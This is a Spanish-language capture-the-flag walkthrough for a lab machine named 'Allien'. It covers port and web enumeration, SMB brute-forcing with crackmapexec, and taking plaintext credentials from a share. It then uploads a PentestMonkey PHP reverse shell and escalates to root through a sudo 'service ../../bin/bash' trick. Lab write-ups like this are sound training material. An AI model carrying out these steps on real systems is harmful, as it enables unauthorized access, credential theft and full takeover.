
# Allien
![image](https://github.com/user-attachments/assets/7fcabe7e-bd29-4322-916d-3478628d8599)


## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
sudo nmap -sSCV -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.
```
```bash
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```
Como el puerto 80 está abierto hacemos fuzzing con gobuster para ver qué páginas encontramos.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 3543]
/info.php             (Status: 200) [Size: 72710]
/productos.php        (Status: 200) [Size: 5229]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```
Esto descubre varios directorios útiles, entre ellos /index.php y /productos.php. Al no encontrar información relevante en el contenido de estas rutas, seguimos enumerando puertos de red 139 y 445 (SMB).

Enumeración de SMB
```bash
enum4linux 172.17.0.2
```
Nos encontramos con varios suario y mediante fuerza bruta obtenemos la contraseña de uno de ellos.

![image](https://github.com/user-attachments/assets/4c5a3858-ae93-469c-8f8c-82c8d61bef6c)

## Explotación.

Lanzamos **crackmapexec** para uno de los usuario *satriani7*
```bash
crackmapexec smb 172.17.0.2 -u 'satriani7' -p /usr/share/wordlists/rockyou.txt
```
![image](https://github.com/user-attachments/assets/5ec658f3-1c70-4b61-b6a8-cffd0e325fe4)

Ahora podmeos con smbmap enumerar recursos del usuario *satriani7*
```bash
smbmap -H 172.17.0.2 -u satriani7 -p 50cent
````
![image](https://github.com/user-attachments/assets/58f7b77d-fc96-4565-97ae-780e3e606c1c)

Vemos que tenemos acceso de lectura a los directorios *myshare* y *backup24* que es donde encontraremos información útil.
```bash
smbclient //172.17.0.2/backup24 -U satriani7
```
![image](https://github.com/user-attachments/assets/75cc8b4c-4f6e-48d7-bf62-ef59f8771a73)

```bash
get credentials.txt
```
En el archivo nos encontramos con las credenciales de varios usuarios y sus contraseñas, vamos a utilizar las del usuario *administrador* para ver los recursos compartidos y luego con *smbclient* conectarnos a la máquina.
```bash
smbmap -H 172.17.0.2 -u administrador -p Adm1nP4ss2024
```
![image](https://github.com/user-attachments/assets/cb47faa2-92e4-48d3-8bb0-55dca5511e67)

```bash
smbclient //172.17.0.2/home -U administrador
```
![image](https://github.com/user-attachments/assets/2dabfdbc-60f6-454e-9f1a-5b3ef57ea7be)

Podemos observar que es el directorio donde se encuentras las páginas php, así que como tenemos permisos de escritura subimos una revershell, en mi caso de [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), sustituimos la IP y PUERTO con los nuestros y la subimos al directorio.

```bash
put shell.php
```
Una vez que la hemos subido, nos ponemos en escucha por el puerto especificado y en el navegador ponemos la dirección de la página subida.
![image](https://github.com/user-attachments/assets/ff80edc9-4773-4dc7-a90f-d6dffff7706f)

![image](https://github.com/user-attachments/assets/e81330b0-b89a-41e2-9aee-af859842266d)

Hacemos una tratamiento de la tty.
```bash
script -c bash /dev/null
Ctrl+Z
stty -echo raw;fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## Escalada de Privilegios.
Ya estamos dentro de la máquina como el usuario *www-data*, vemos si tenemos algún prvilegio sudo y vemos que podemos ejecutar */usr/sbin/service* como **root**.

![image](https://github.com/user-attachments/assets/9cc801a0-15a4-4fa8-a604-2bfa393286a2)

```bash
sudo /usr/sbin/service ../../bin/bash
```
![image](https://github.com/user-attachments/assets/8fc3fe3e-46c5-401b-8e16-f37e3332cb3f)







